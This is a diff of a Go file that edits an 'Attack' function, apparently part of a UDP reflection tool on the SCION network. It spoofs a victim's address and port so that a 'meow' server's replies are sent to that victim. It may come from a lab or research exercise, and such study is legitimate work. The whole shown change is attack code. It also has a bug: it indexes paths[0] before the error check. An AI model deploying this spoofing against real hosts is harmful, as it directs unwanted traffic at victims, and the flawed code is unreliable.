@@ -172,14 +172,23 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 			//fmt.Println("Write success, bytes written", n_bytes)
 		}
 	} else {
-		fmt.Println(spoofedAddr.IA, meowSCIONAddr.IA)
+		fmt.Println(spoofedAddr.IA, meowSCIONAddr.IA, spoofedAddr.Host, spoofedAddr.Host.Port, VictimPort())
 		scionNetwork := snet.NewNetwork(spoofedAddr.IA, dispatcher, nil)
 		paths, err := scionDaemon.Paths(ctx, spoofedAddr.IA, meowSCIONAddr.IA, daemon.PathReqFlags{})
+		path := paths[0]
+
+		meowSCIONAddr.Path = path.Path()
+		meowSCIONAddr.Path.Reverse()
+		meowSCIONAddr.NextHop = path.UnderlayNextHop()
+
+		fmt.Println("localIA, meowScionAddr", scionNetwork.LocalIA, meowSCIONAddr)
+
 		if err != nil {
 			log.Fatal("Error fetching paths from scion daemon", err)
 		}
 		fmt.Println("Fetched paths", paths)
 
+		spoofedAddr.Host.Port = VictimPort()
 		conn, err := scionNetwork.Dial(ctx, "udp", spoofedAddr.Host, meowSCIONAddr, addr.SvcNone)
 
 		if err != nil {
